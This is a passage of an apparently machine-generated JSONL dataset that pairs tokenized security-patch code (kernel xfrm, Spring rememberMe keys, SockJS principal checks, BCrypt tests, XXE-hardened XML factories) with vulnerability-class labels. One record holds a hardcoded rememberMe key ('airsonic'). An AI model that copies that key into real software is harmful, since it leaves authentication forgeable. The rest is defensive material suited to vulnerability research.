")", ">", "sizeof", "(", "cb", "-", ">", "args", ")", "-", "sizeof", "(", "cb", "-", ">", "args", "[", "0", "]", "))", ";", "if", "(", "!", "cb", "-", ">", "args", "[", "0", "]", ")", "{", "cb", "-", ">", "args", "[", "0", "]", "=", "1", ";", "xfrm_policy_walk_init", "(", "walk", ",", "XFRM_POLICY_TYPE_ANY", ")", ";", "}"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["import", "java", ".", "security", ".", "SecureRandom", ";", "private", "static", "final", "String", "key", ";", "static", "{", "byte", "[", "]", "array", "=", "new", "byte", "[", "32", "]", ";", "new", "SecureRandom", "(", ").", "nextBytes", "(", "array", ")", ";", "key", "=", "new", "String", "(", "array", ")", ";", "}", ".", "and", "(", ").", "rememberMe", "(", ").", "key", "(", "key", ")", ";", "}</s>.", "and", "(", ").", "rememberMe", "(", ").", "key", "(", "\"", "airsonic", "\"", ");", "}"], "docstring_tokens": ["using", "brute", "force", "techniques"]}
{"contents": ["empty"], "code_tokens": ["import", "java", ".", "net", ".", "InetSocketAddress", ";", "import", "java", ".", "security", ".", "Principal", ";", "else", "{", "if", "(", "session", ".", "getPrincipal", "(", ")", "!", "=", "null", ")", "{", "if", "(", "!", "session", ".", "getPrincipal", "(", ").", "equals", "(", "request", ".", "getPrincipal", "(", "))", ")", "{", "logger", ".", "debug", "(", "\"", "The", "user", "for", "the", "session", "does", "not", "match", "the", "user", "for", "the", "request", ".", "\")", ";", "response", ".", "setStatusCode", "(", "HttpStatus", ".", "NOT_FOUND", ")", ";", "return", ";", "}", "}", "}", "import", "org", ".", "springframework", ".", "web", ".", "socket", ".", "handler", ".", "TestPrincipal", ";", "@", "Test", "public", "void", "handleTransportRequestXhrSendWithDifferentUser", "(", ")", "throws", "Exception", "{", "String", "sockJsPath", "=", "sessionUrlPrefix", "+", "\"", "xhr", "\"", ";", "setRequest", "(", "\"", "POST", "\"", ",", "sockJsPrefix", "+", "sockJsPath", ")", ";", "this", ".", "service", ".", "handleRequest", "(", "this", ".", "request", ",", "this", ".", "response", ",", "sockJsPath", ",", "this", ".", "wsHandler", ")", ";", "assertEquals", "(", "200", ",", "this", ".", "servletResponse", ".", "getStatus", "(", "))", ";", "/", "/", "session", "created", "verify", "(", "this", ".", "xhrHandler", ")", ".", "handleRequest", "(", "this", ".", "request", ",", "this", ".", "response", ",", "this", ".", "wsHandler", ",", "this", ".", "session", ")", ";", "this", ".", "session", ".", "setPrincipal", "(", "new", "TestPrincipal", "(", "\"", "little", "red", "riding", "hood", "\"", "))", ";", "this", ".", "servletRequest", ".", "setUserPrincipal", "(", "new", "TestPrincipal", "(", "\"", "wolf", "\"", "))", ";", "resetResponse", "(", ");", "reset", "(", "this", ".", "xhrSendHandler", ")", ";", "sockJsPath", "=", "sessionUrlPrefix", "+", "\"", "xhr_send", "\"", ";", "setRequest", "(", "\"", "POST", "\"", ",", "sockJsPrefix", "+", "sockJsPath", ")", ";", "this", ".", "service", ".", "handleRequest", "(", "this", ".", "request", ",", "this", ".", "response", ",", "sockJsPath", ",", "this", ".", "wsHandler", ")", ";", "assertEquals", "(", "404", ",", "this", ".", "servletResponse", ".", "getStatus", "(", "))", ";", "verifyNoMoreInteractions", "(", "this", ".", "xhrSendHandler", ")", ";", "}</s>"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "rawPassword", "=", "=", "null", ")", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "rawPassword", "cannot", "be", "null", "\"", ");", "}", "if", "(", "rawPassword", "=", "=", "null", ")", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "rawPassword", "cannot", "be", "null", "\"", ");", "}", "@", "Test", "(", "expected", "=", "IllegalArgumentException", ".", "class", ")", "public", "void", "encodeNullRawPassword", "(", ")", "{", "BCryptPasswordEncoder", "encoder", "=", "new", "BCryptPasswordEncoder", "(", ");", "encoder", ".", "encode", "(", "null", ")", ";", "}", "@", "Test", "(", "expected", "=", "IllegalArgumentException", ".", "class", ")", "public", "void", "matchNullRawPassword", "(", ")", "{", "BCryptPasswordEncoder", "encoder", "=", "new", "BCryptPasswordEncoder", "(", ");", "encoder", ".", "matches", "(", "null", ",", "\"", "does", "-", "not", "-", "matter", "\"", ");", "}</s>"], "docstring_tokens": ["using", "dictionary", "attack", "techniques"]}
{"contents": ["empty"], "code_tokens": ["import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "private", "static", "TransformerFactory", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "private", "DocumentBuilderFactory", "documentBuilderFactory", ";", "/", "**", "*", "Use", "default", "{", "@", "link", "DocumentBuilderFactory", "}", ".", "*", "/", "this", "(", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", "))", ";", "}", "/", "**", "*", "Provide", "your", "own", "{", "@", "link", "DocumentBuilderFactory", "}", ".", "*", "*", "@", "param", "documentBuilderFactory", "*", "/", "public", "DomPoxMessageFactory", "(", "DocumentBuilderFactory", "documentBuilderFactory", ")", "{", "this", ".", "documentBuilderFactory", "=", "documentBuilderFactory", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "XMLInputFactoryUtils", ";", "return", "XMLInputFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "MethodParameter", ";", "import", "org", ".", "springframework", ".", "xml", ".", "JaxpVersion", ";", "import", "org", ".", "springframework", ".", "xml", ".", "XMLInputFactoryUtils", ";", "return", "XMLInputFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "XMLInputFactoryUtils", ";", "return", "XMLInputFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "MethodParameter", ";", "import", "org", ".", "springframework", ".", "ws", ".", "server", ".", "endpoint", ".", "adapter", ".", "method", ".", "AbstractPayloadSourceMethodProcessor", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "return", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "setTransformerFactory", "(", "TransformerFactoryUtils", ".", "newInstance", "(", "))", ";", "}", "/", "**", "*", "Override", "the", "default", "{", "@", "link", "TransformerFactory", "}", ".", "*", "*", "@", "param", "transformerFactory", "*", "/", "public", "static", "void", "setTransformerFactory", "(", "TransformerFactory", "transformerFactory", ")", "{", "PayloadRootAnnotationMethodEndpointMapping", ".", "transformerFactory", "=", "transformerFactory", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "setTransformerFactory", "(", "TransformerFactoryUtils", ".", "newInstance", "(", "))", ";", "/", "**", "*", "Override", "the", "default", "{", "@", "link", "TransformerFactory", "}", ".", "*", "*", "@", "param", "transformerFactory", "*", "/", "public", "static", "void", "setTransformerFactory", "(", "TransformerFactory", "transformerFactory", ")", "{", "PayloadRootQNameEndpointMapping", ".", "transformerFactory", "=", "transformerFactory", ";", "}", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "private", "static", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "XMLInputFactoryUtils", ";", "XMLInputFactory", "inputFactory", "=", "XMLInputFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "util", ".", "FileCopyUtils", ";", "import", "org", ".", "springframework", ".", "util", ".", "xml", ".", "StaxUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "XMLInputFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "sax", ".", "SaxUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "StringResult", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "TransformerFactory", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactoryUtils", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "TransformerFactory", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "final", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "final", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "final", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "final", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "StringResult", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "StringSource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "TransformerFactory", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "util", ".", "xml", ".", "StaxUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "XMLInputFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactoryUtils", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "StringResult", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "StringSource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "import", "static", "org", ".", "easymock", ".", "EasyMock", ".", "*;", "import", "static", "org", ".", "junit", ".", "Assert", ".", "fail", ";", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "apache", ".", "axiom", ".", "om", ".", "OMAbstractFactory", ";", "import", "org", ".", "apache", ".", "axiom", ".", "soap", ".", "SOAPFactory", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertFalse", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotNull", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNull", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "junit", ".", "Assert", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "final", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Element", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "*;", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "TransformerFactory", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "util", ".", "xml", ".", "StaxUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "XMLInputFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "QName", "qName", "=", "PayloadRootUtils", ".", "getPayloadRootQName", "(", "source", ",", "TransformerFactoryUtils", ".", "newInstance", "(", "))", ";", "XMLInputFactory", "inputFactory", "=", "XMLInputFactoryUtils", ".", "newInstance", "(", ");", "QName", "qName", "=", "PayloadRootUtils", ".", "getPayloadRootQName", "(", "source", ",", "TransformerFactoryUtils", ".", "newInstance", "(", "))", ";", "XMLInputFactory", "inputFactory", "=", "XMLInputFactoryUtils", ".", "newInstance", "(", ");", "QName", "qName", "=", "PayloadRootUtils", ".", "getPayloadRootQName", "(", "source", ",", "TransformerFactoryUtils", ".", "newInstance", "(", "))", ";", "QName", "qName", "=", "PayloadRootUtils", ".", "getPayloadRootQName", "(", "source", ",", "TransformerFactoryUtils", ".", "newInstance", "(", "))", ";", "QName", "qName", "=", "PayloadRootUtils", ".", "getPayloadRootQName", "(", "source", ",", "TransformerFactoryUtils", ".", "newInstance", "(", "))", ";", "QName", "qName", "=", "PayloadRootUtils", ".", "getPayloadRootQName", "(", "null", ",", "TransformerFactoryUtils", ".", "newInstance", "(", "))", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "TransformerFactory", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ";", "import", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLUnit", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "*;", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "util", ".", "FileCopyUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "sax", ".", "SaxUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "StringSource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "util", ".", "StringUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "ResourceSource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "junit", ".", "Assert", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "xsd", ".", "SimpleXsdSchema", ";", "import", "org", ".", "springframework", ".", "xml", ".", "xsd", ".", "commons", ".", "CommonsXsdSchemaCollection", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "TransformerFactory", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "sax", ".", "SaxUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "sax", ".", "SaxUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "*;", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "/", "*", "*", "Copyright", "2018", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "springframework", ".", "xml", ";", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilderFactory", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "ParserConfigurationException", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "/", "**", "*", "@", "author", "Greg", "Turnquist", "*", "@", "since", "3", ".", "0", ".", "5", "*", "/", "public", "class", "DocumentBuilderFactoryUtils", "{", "private", "static", "final", "Log", "log", "=", "LogFactory", ".", "getLog", "(", "DocumentBuilderFactoryUtils", ".", "class", ")", ";", "/", "**", "*", "Build", "a", "{", "@", "link", "DocumentBuilderFactory", "}", "then", "set", "properties", "to", "prevent", "external", "entity", "access", ".", "*", "*", "@", "see", "DocumentBuilderFactory", "#", "newInstance", "(", ")", "*", "/", "public", "static", "DocumentBuilderFactory", "newInstance", "(", ")", "{", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "try", "{", "factory", ".", "setAttribute", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "}", "catch", "(", "IllegalArgumentException", "e", ")", "{", "if", "(", "log", ".", "isWarnEnabled", "(", "))", "{", "log", ".", "warn", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", "+", "\"", "property", "not", "supported", "by", "\"", "+", "factory", ".", "getClass", "(", ").", "getCanonicalName", "(", "))", ";", "}", "}", "try", "{", "factory", ".", "setAttribute", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_SCHEMA", ",", "\"", "\")", ";", "}", "catch", "(", "IllegalArgumentException", "e", ")", "{", "if", "(", "log", ".", "isWarnEnabled", "(", "))", "{", "log", ".", "warn", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_SCHEMA", "+", "\"", "property", "not", "supported", "by", "\"", "+", "factory", ".", "getClass", "(", ").", "getCanonicalName", "(", "))", ";", "}", "}", "try", "{", "factory", ".", "setFeature", "(", "\"", "http", ":", "//", "apache", ".", "org", "/", "xml", "/", "features", "/", "disallow", "-", "doctype", "-", "decl", "\"", ",", "true", ")", ";", "}", "catch", "(", "ParserConfigurationException", "e", ")", "{", "if", "(", "log", ".", "isWarnEnabled", "(", "))", "{", "log", ".", "warn", "(", "\"", "FEATURE", "'", "http", ":", "//", "apache", ".", "org", "/", "xml", "/", "features", "/", "disallow", "-", "doctype", "-", "decl", "'", "is", "probably", "not", "supported", "by", "\"", "+", "factory", ".", "getClass", "(", ").", "getCanonicalName", "(", "))", ";", "}", "}", "try", "{", "factory", ".", "setFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", ",", "false", 